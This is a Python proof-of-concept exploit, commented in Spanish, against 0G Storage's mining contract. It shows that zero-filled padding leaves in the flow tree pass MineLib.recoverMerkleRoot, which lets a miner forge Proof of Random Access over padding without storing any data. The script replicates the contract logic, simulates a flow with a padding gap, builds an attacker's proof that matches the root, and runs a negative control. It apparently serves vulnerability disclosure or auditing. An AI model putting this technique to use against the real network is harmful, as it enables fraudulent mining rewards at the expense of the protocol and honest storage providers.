#!/usr/bin/env python3
"""
PoC: una hoja "vacía" (padding) del flow tree de 0G Storage produce una prueba
Merkle válida contra el flowRoot, sin almacenar ni un byte.

Replica exactamente MineLib.recoverMerkleRoot() de
0g-storage-contracts/contracts/miner/MineLib.sol:

  - leaf(seal 4KB) = keccak256(16 sectores de 256B) y plegado de 4 niveles
    (16 hojas -> 1 nodo de 4KB)
  - plegado con merkleProof usando unsealedIndex = recallPosition / SECTORS_PER_SEAL
    y keccak256(abi.encode(left,right)) == keccak256(left||right)

Y comprueba que zeros(0) = keccak256(256 bytes cero) = constante del contrato,
es decir, que el hueco de padding ES una hoja válida del árbol.
"""
from Crypto.Hash import keccak
import os, random

SECTORS_PER_SEAL = 64        # 4 KB / 256 B
UNITS_PER_SECTOR = 8

def k(b: bytes) -> bytes:
    h = keccak.new(digest_bits=256); h.update(b); return h.digest()

ZERO_ENTRY = b"\x00" * 256
ZERO_LEAF = k(ZERO_ENTRY)
CONTRACT_ZEROS0 = bytes.fromhex("d397b3b043d87fcd6fad1291ff0bfd16401c274896d8c63a923727f077b8e0b5")

def leaf_of_seal(seal: bytes) -> bytes:
    """4KB seal -> 4KB merkle node (16 sectores 256B, 4 niveles)."""
    assert len(seal) == 4096
    lv = [k(seal[i*256:(i+1)*256]) for i in range(16)]
    for _ in range(4):
        lv = [k(lv[i] + lv[i+1]) for i in range(0, len(lv), 2)]
    return lv[0]

EMPTY_4KB = leaf_of_seal(b"\x00" * 4096)   # == zeros(4) del contrato

def build_flow(nodes: int, empty_positions: set):
    """Árbol binario de nodos de 4KB; las posiciones de padding son 'vacías'."""
    leaves = []
    for i in range(nodes):
        leaves.append(EMPTY_4KB if i in empty_positions else leaf_of_seal(os.urandom(4096)))
    levels = [leaves]
    while len(levels[-1]) > 1:
        cur = levels[-1]
        levels.append([k(cur[i] + cur[i+1]) for i in range(0, len(cur), 2)])
    return levels

def proof_for(levels, idx):
    proof = []
    for lv in levels[:-1]:
        proof.append(lv[idx ^ 1])
        idx //= 2
    return proof

def recover_root(unsealed_seal: bytes, recall_position: int, proof) -> bytes:
    """Copia literal de MineLib.recoverMerkleRoot."""
    cur = leaf_of_seal(unsealed_seal)
    idx = recall_position // SECTORS_PER_SEAL
    for sib in proof:
        cur = k((cur + sib) if idx % 2 == 0 else (sib + cur))
        idx //= 2
    return cur

def main():
    print("zeros(0) contrato =", CONTRACT_ZEROS0.hex())
    print("keccak(256 ceros) =", ZERO_LEAF.hex())
    assert ZERO_LEAF == CONTRACT_ZEROS0, "no coinciden -> el hueco NO seria hoja valida"
    print("[OK] la hoja de padding es exactamente zeros(0) del contrato\n")

    # Simulación de un tramo del flow: 2 submissions de 1024 y 2048 nodos de 4KB,
    # separadas por un hueco de padding (lo que hace FlowTreeLib.pad()).
    sub1 = list(range(0, 1024))                  # datos reales seq N
    gap  = list(range(1024, 2048))               # PADDING (1024 * 4KB = 4 MB vacíos)
    sub2 = list(range(2048, 4096))               # datos reales seq N+1
    empty = set(gap)
    levels = build_flow(4096, empty)
    root = levels[-1][0]
    print("flowRoot simulado =", root.hex())
    print("posiciones totales = 4096 nodos de 4KB = %d MB" % (4096*4//1024))
    print("nodo vacío de 4KB  =", EMPTY_4KB.hex(), "(== zeros(4))")
    print("posiciones vacías  = %d (%.1f%%)\n" % (len(gap), 100*len(gap)/4096))

    # Atacante: elige una posición dentro del padding, sin datos.
    target_node = 1500
    recall_position = target_node * SECTORS_PER_SEAL
    unsealed_seal = b"\x00" * 4096               # 16 sectores de ceros
    proof = proof_for(levels, target_node)
    got = recover_root(unsealed_seal, recall_position, proof)

    print("recallPosition   =", recall_position, "(sector)  chunk de precio =",
          recall_position // (8*1024*1024*1024//256))
    print("merkleProof len  =", len(proof))
    print("root reconstruido=", got.hex())
    assert got == root
    print("[OK] recoverMerkleRoot(unsealed=ceros, proof=zeros+siblings) == flowRoot")
    print("[OK] PoRA puede hacerse sobre padding: no hace falta almacenar nada")

    # Control negativo: una hoja de datos real no se puede falsear con ceros.
    bad = recover_root(b"\x00"*4096, 100*SECTORS_PER_SEAL, proof_for(levels, 100))
    print("\ncontrol (posición con datos reales, misma estrategia):",
          "ACEPTA (mal)" if bad == root else "rechaza (correcto)")

if __name__ == "__main__":
    main()
